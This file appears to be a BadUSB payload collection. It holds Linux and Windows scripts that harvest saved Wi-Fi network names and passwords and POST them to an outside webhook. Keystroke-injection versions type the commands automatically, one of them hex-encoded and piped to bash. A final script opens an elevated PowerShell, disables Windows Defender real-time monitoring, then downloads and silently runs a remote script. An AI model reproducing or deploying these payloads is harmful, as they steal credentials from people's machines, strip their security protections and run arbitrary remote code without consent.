# Linux

## Comando Terminal
### Normal
```bash
#!/bin/bash

json=$(bash -c '
items=()

while IFS= read -r name; do
    psk=$(nmcli -s -g 802-11-wireless-security.psk connection show "$name" 2>/dev/null)

    if [ -n "$psk" ]; then
        items+=("{\"SSID\":\"$(printf "%s" "$name" | sed '\''s/\\/\\\\/g; s/"/\\"/g'\'')\",\"Password\":\"$(printf "%s" "$psk" | sed '\''s/\\/\\\\/g; s/"/\\"/g'\'')\"}")
    fi
done < <(nmcli -t -f NAME connection show)

printf "[%s]\n" "$(IFS=,; echo "${items[*]}")"
')

curl -X POST \
  'https://n8n.caju.dpdns.org/webhook/bot' \
  -H 'Content-Type: application/json' \
  --data "$json" 
```
### Compacto
```bash
#!/bin/bash

curl -X POST 'https://n8n.caju.dpdns.org/webhook/bot' -H 'Content-Type: application/json' --data "$(IFS=,;i=();while read -r n;do p=$(nmcli -s -g 802-11-wireless-security.psk connection show "$n" 2>/dev/null);[[ -n $p ]]&&i+=("{\"SSID\":\"${n//\"/\\\"}\",\"PWD\":\"${p//\"/\\\"}\"}");done< <(nmcli -t -f NAME connection show);echo "[${i[*]}]")"
```
## Script
```bash
Delay 2000
CtrlAltT
Delay 100

Print echo
Press KEY_SPACE

Press KEY_LEFT_CTRL
Press KEY_LEFT_SHIFT
Press u
Release
Print 0027
PressRelease KEY_ENTER

Delay 200
Print 6375726c202d5820504f5354202768747470733a2f2f6e386e2e63616a75
Print 2e6470646e732e6f72672f776562686f6f6b2f626f7427202d482027436f
Print 6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e2720
Print 2d2d64617461202224284946533d2c3b693d28293b7768696c6520726561
Print 64202d72206e3b646f20703d24286e6d636c69202d73202d67203830322d
Print 31312d776972656c6573732d73656375726974792e70736b20636f6e6e65
Print 6374696f6e2073686f772022246e2220323e2f6465762f6e756c6c293b5b
Print 5b202d6e202470205d5d2626692b3d28227b5c22535349445c223a5c2224
Print 7b6e2f2f5c222f5c5c5c227d5c222c5c225057445c223a5c22247b702f2f
Print 5c222f5c5c5c227d5c227d22293b646f6e653c203c286e6d636c69202d74
Print 202d66204e414d4520636f6e6e656374696f6e2073686f77293b6563686f
Print 20225b247b695b2a5d7d5d2229220a

Press KEY_LEFT_CTRL
Press KEY_LEFT_SHIFT
Press u
Release
Print 0027
PressRelease KEY_ENTER

PrintLine | xxd -r -p | bash
Delay 100
PrintLine exit
```

# Windows
## Comando Terminal
```bash
$p="$env:TEMP\p";
md $p -f|Out-Null;cd $p;
netsh wlan export profile key=clear|Out-Null;
$r=ls *.xml|%{$x=[xml](gc $_.FullName -ea 0); if($x.WLANProfile.Name -and $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial){[PSCustomObject]@{S=$x.WLANProfile.Name;P=$x.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}}

$w = "https://n8n.caju.dpdns.org/webhook/bot"

$j=($x|?{$_.WLANProfile.Name -and $_.WLANProfile.MSM.Security.SharedKey.KeyMaterial}|%{[PSCustomObject]@{S=$_.WLANProfile.Name;P=$_.WLANProfile.MSM.Security.SharedKey.KeyMaterial}})|ConvertTo-Json -Compress;
irm $w -me Post -bo $j -con 'application/json;charset=utf-8' -ea 0

rm $p -r -fo -ea 0;
exit
```
## Script Direto
```bash
Delay 1000
GuiR
WinPrintLine powershell
Delay 1000

WinPrintLine $w = "https://n8n.caju.dpdns.org/webhook/bot"
WinPrintLine netsh wlan export profile key=clear|Out-Null;
WinPrintLine $j=(ls *.xml|%{$x=[xml](gc $_ -ea 0);
WinPrintLine if($x.WLANProfile.MSM.Security.SharedKey.KeyMaterial){[PSCustomObject]@{S=$x.WLANProfile.Name;
WinPrintLine P=$x.WLANProfile.MSM.Security.SharedKey.KeyMaterial}}})|ConvertTo-Json -Compress;
WinPrintLine irm $w -me Post -bo $j -con 'application/json;charset=utf-8' -ea 0

WinPrintLine rm *.xml -fo -ea 0
WinPrintLine exit
```
## Executar de Scrip Remoto
```bash
Delay 1000
GuiR
WinPrintLine powershell Start-Process powershell -Verb runAs
Delay 1000
Press KEY_LEFT_ALT
Press Y
Release
Delay 2000
Press KEY_LEFT_ARROW
PressRelease KEY_ENTER
Release
Delay 1000

WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true

## Definir URL do Script

WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/ECCW/wifiPWD/script.ps1';
WinPrintLine $d=New-Object Net.WebClient; $f='t.ps1';$d.DownloadFile($u,$f); powershell -w h -c "gc $f -Raw|iex";

```